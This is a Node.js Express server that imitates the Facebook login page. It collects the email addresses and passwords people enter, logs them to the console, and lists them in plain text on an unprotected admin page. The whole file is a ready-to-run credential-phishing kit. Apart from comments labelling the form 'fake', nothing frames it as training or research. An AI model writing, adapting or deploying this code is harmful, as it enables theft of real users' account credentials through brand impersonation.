const express = require('express');
const app = express();
const port = process.env.PORT || 3000;

app.use(express.urlencoded({ extended: true }));

const capturedLogins = [];

app.use((req, res, next) => {
  console.log(`[${new Date().toISOString()}] ${req.method} ${req.url}`);
  next();
});

// Escape HTML special characters to prevent script injection
function escapeHtml(text) {
  return text.replace(/[&<>"']/g, match => ({
    '&': "&amp;",
    '<': "&lt;",
    '>': "&gt;",
    '"': "&quot;",
    "'": "&#039;"
  })[match]);
}

// === FAKE FACEBOOK FORM ===
app.get('/', (req, res) => {
  res.send(`
    <!DOCTYPE html>
    <html>
    <head>
      <meta charset="UTF-8">
      <title>Facebook</title>
      <style>
        body { background-color: #f0f2f5; font-family: Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; }
        .container { background: white; padding: 40px; border-radius: 8px; box-shadow: 0 2px 8px rgba(0,0,0,0.2); width: 300px; text-align: center; }
        .container h1 { color: #1877f2; font-size: 36px; margin-bottom: 20px; }
        input[type="text"], input[type="password"] {
          width: 90%; padding: 10px; margin: 10px 0; border: 1px solid #ccc; border-radius: 6px;
        }
        button {
          width: 95%; padding: 10px; background-color: #1877f2; color: white; border: none; border-radius: 6px;
          font-weight: bold; margin-top: 10px; cursor: pointer;
        }
      </style>
    </head>
    <body>
      <div class="container">
        <h1>facebook</h1>
        <form method="POST" action="/login">
          <input type="text" name="email" placeholder="Email or phone number" required><br>
          <input type="password" name="password" placeholder="Password" required><br>
          <button type="submit">Log In</button>
        </form>
      </div>
    </body>
    </html>
  `);
});

// === LOGIN POST ===
app.post('/login', (req, res) => {
  const { email, password } = req.body || {};
  const loginData = {
    email: escapeHtml(email || ''),
    password: escapeHtml(password || ''),
    time: new Date().toLocaleString()
  };

  capturedLogins.push(loginData);
  console.log(`FAKE LOGIN — Email: ${loginData.email}, Password: ${loginData.password}`);

  res.send(`
    <html>
    <head><meta charset="UTF-8"><title>Processing</title></head>
    <body style="font-family:sans-serif; text-align:center; padding-top:60px;">
      <h2>Thank you. Redirecting...</h2>
      <script>
        setTimeout(() => {
          window.location.href = "/";
        }, 2000);
      </script>
    </body>
    </html>
  `);
});

// === ADMIN VIEW ===
app.get('/admin', (req, res) => {
  const rows = capturedLogins.map(entry => `
    <tr>
      <td>${entry.time}</td>
      <td>${entry.email}</td>
      <td>${entry.password}</td>
    </tr>
  `).join('');

  res.send(`
    <!DOCTYPE html>
    <html>
    <head>
      <meta charset="UTF-8">
      <title>Admin Viewer</title>
      <style>
        body { font-family: sans-serif; background: #f4f4f4; padding: 40px; }
        table { width: 100%; border-collapse: collapse; background: white; box-shadow: 0 2px 8px rgba(0,0,0,0.1); }
        th, td { padding: 12px; border-bottom: 1px solid #ddd; text-align: left; }
        th { background: #1877f2; color: white; }
        tr:hover { background-color: #f1f1f1; }
        h2 { color: #333; margin-bottom: 20px; }
      </style>
    </head>
    <body>
      <h2>Captured Login Attempts</h2>
      <table>
        <tr><th>Time</th><th>Email/Phone</th><th>Password</th></tr>
        ${rows || '<tr><td colspan="3">No data yet</td></tr>'}
      </table>
    </body>
    </html>
  `);
});

// === Health Check ===
app.get('/ping', (req, res) => res.send("pong"));

// === Error Handling ===
app.use((err, req, res, next) => {
  console.error("Server error:", err);
  res.status(500).send("Something broke.");
});

app.listen(port, () => {
  console.log(`✅ Server running on http://localhost:${port}`);
});
